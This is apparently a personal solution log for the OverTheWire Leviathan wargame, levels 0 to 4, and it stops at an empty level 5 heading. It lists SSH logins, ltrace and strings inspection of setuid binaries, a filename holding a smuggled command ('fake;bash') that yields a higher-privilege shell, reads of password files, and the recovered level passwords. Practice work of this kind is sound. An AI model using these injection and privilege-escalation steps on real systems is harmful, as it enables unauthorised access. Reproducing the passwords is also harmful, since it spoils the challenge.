lvl 0 --> lvl 1
ssh leviathan0@leviathan.labs.overthewire.org -p 2223
leviathan0
ls -a
cd .backup/
ls
cat bookmarks.html | grep -i 'password'
rioGegei8m

lvl 1 --> lvl 2
ssh leviathan1@leviathan.labs.overthewire.org -p 2223
ls
./check
ltrace ./check 
// we see this line strcmp("hel", "sex") // the password is probably sex, we obtain a bash
cat /etc/leviathan_pass/leviathan2
ougahZi8Ta

lvl 2 --> lvl 3
ssh leviathan2@leviathan.labs.overthewire.org -p 2223
ls
./printfile
./printfile /etc/passwd // it prints out the whole file
ls -l // answer : -r-sr-x--- 1 leviathan3 leviathan2 7436 Oct 29 21:17 printfile, the s means it is owned by leviathan3
// the highligt over printfile meeans that it is a setuid binary, running it allows us to benefit from the previledges that lev3 has. Previledge elevation in other words.
./printfile /etc/leviathan_pass/leviathan3 // You cant have that file...
mktemp -d
cd /tmp/tmp.Q7WF3s2Lxd
touch 'fake;bash'
// Curiously we became leviathan3@leviathan:/tmp/tmp.Q7WF3s2Lxd$
cat /etc/leviathan_pass/leviathan3
Ahdiemoo1j

lvl 3 --> lvl 4
ssh leviathan3@leviathan.labs.overthewire.org -p 2223
ls 
./level3
ls -l // it is a setuid binary
strings ./level3 | less // to see the content
ltrace ./level3 // strcmp("h0no33", "kakaka")  
// we get strcmp("kakaka\n", "snlprintf\n")  
./level3
snlprintf
cat /etc/leviathan_pass/leviathan4
vuH0coox6m

lvl 4 --> lvl 5
